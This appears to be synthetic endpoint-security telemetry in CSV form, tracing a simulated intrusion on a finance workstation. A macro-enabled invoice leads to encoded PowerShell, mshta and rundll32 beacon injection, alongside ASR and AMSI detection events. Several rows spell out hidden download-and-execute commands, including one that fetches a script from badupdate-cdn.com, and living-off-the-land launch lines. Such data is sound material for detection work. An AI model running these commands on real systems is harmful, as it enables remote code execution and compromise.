TimeGenerated,DeviceName,DeviceId,ActionType,FileName,FolderPath,SHA1,AccountName,AccountDomain,AccountSid,InitiatingProcessAccountName,InitiatingProcessAccountUpn,InitiatingProcessFileName,InitiatingProcessCommandLine,InitiatingProcessParentFileName,RemoteUrl,AdditionalFields,ReportId
2026-06-10T08:34:51Z,HR-WS-03,e7e7e7e7-3333-4444-5555-000000000003,PnpDeviceConnected,,,,meganb,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-3501,meganb,meganb@contoso.com,svchost.exe,svchost.exe -k UnistackSvcGroup,services.exe,,"{""DeviceDescription"":""SanDisk Ultra USB 3.0"",""ClassName"":""DiskDrive"",""DeviceId"":""USBSTOR\\DISK&VEN_SANDISK""}",4102301
2026-06-10T08:35:22Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,AsrOfficeChildProcessAudited,WINWORD.EXE,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,a3f5c1e9d2b7048e6f1a9c3b5d7e0f2a4c6b8d10,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n ""C:\Users\alexw\Downloads\Invoice_Q2_Remittance.docm""",explorer.exe,,"{""RuleId"":""d4f940ab-401b-4efc-aadc-ad5f3c50688a"",""RuleName"":""Block all Office applications from creating child processes"",""IsAudit"":true}",4102544
2026-06-10T08:35:24Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,AsrOfficeChildProcessBlocked,cmd.exe,C:\Windows\System32\cmd.exe,9a74f8b21cce6f0d4a2e8b3c5d7f1029e4b6a8c0,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE""",explorer.exe,,"{""RuleId"":""d4f940ab-401b-4efc-aadc-ad5f3c50688a"",""RuleName"":""Block all Office applications from creating child processes"",""IsAudit"":false,""ChildProcess"":""cmd.exe""}",4102561
2026-06-10T08:36:09Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,PowerShellCommand,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,b1d2e3f405162738495a6b7c8d9e0f1122334455,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,powershell.exe,"powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnAA==",cmd.exe,,"{""Command"":""IEX (New-Object Net.WebClient).DownloadString"",""Encoded"":true}",4102588
2026-06-10T08:36:11Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,AntivirusDetection,amsi_script_4471.ps1,C:\Users\alexw\AppData\Local\Temp\amsi_script_4471.ps1,c2e4a6081a3b5d7f9e1c3a5b7d9f1e3a5c7b9d11,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,powershell.exe,"powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnAA==",cmd.exe,,"{""ThreatName"":""Trojan:PowerShell/Cobal_Amsi.A"",""DetectionSource"":""AMSI"",""Severity"":""High"",""WasRemediated"":false}",4102590
2026-06-10T08:38:47Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,AmsiUacScanResult,,,,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,powershell.exe,"powershell.exe -nop -w hidden -c IEX(IWR http://badupdate-cdn.com/u.ps1 -UseBasicParsing)",cmd.exe,badupdate-cdn.com,"{""ScanResult"":""Detected"",""ContentName"":""IWR badupdate-cdn.com""}",4102655
2026-06-10T08:41:03Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,AsrUntrustedExecutableBlocked,update.hta,C:\Users\alexw\AppData\Local\Temp\update.hta,d3f5a70921b4c6e8f0a2c4b6d8e0f2a4c6b8d012,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,mshta.exe,"""C:\Windows\System32\mshta.exe"" C:\Users\alexw\AppData\Local\Temp\update.hta",cmd.exe,,"{""RuleId"":""01443614-cd74-433a-b99e-2ecdc07bfc25"",""RuleName"":""Block executable files from running unless they meet a prevalence, age, or trusted list criterion"",""IsAudit"":false}",4102702
2026-06-10T08:41:05Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ProcessCreatedUsingWmiQuery,mshta.exe,C:\Windows\System32\mshta.exe,e4a6b8021c3d5f7901b3d5f7a9c1e3b5d7f9a113,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,mshta.exe,"mshta.exe vbscript:CreateObject(""Wscript.Shell"").Run(""powershell -nop -w hidden -enc ...""):close",wmiprvse.exe,,"{""LolBin"":""mshta.exe"",""Technique"":""T1218.005""}",4102708
2026-06-10T08:42:30Z,HR-WS-03,e7e7e7e7-3333-4444-5555-000000000003,ControlFolderAccessAudited,backup_tool.exe,C:\Program Files\Acme Backup\backup_tool.exe,f5b7c9031d4e6a8012c4e6a8b0d2f4c6e8a0b214,meganb,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-3501,meganb,meganb@contoso.com,backup_tool.exe,"""C:\Program Files\Acme Backup\backup_tool.exe"" --scan ""C:\Users\meganb\Documents""",services.exe,,"{""ProtectedFolder"":""C:\\Users\\meganb\\Documents"",""IsAudit"":true}",4102745
2026-06-10T08:44:18Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,NtAllocateVirtualMemoryRemoteApiCall,rundll32.exe,C:\Windows\System32\rundll32.exe,a6b8c0142e5f7a9013d5e7a9b1c3f5d7e9a1b315,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,rundll32.exe,"rundll32.exe C:\Users\alexw\AppData\Local\Temp\beacon.dll,Start",mshta.exe,,"{""LolBin"":""rundll32.exe"",""TargetProcess"":""explorer.exe"",""Technique"":""T1055""}",4102801
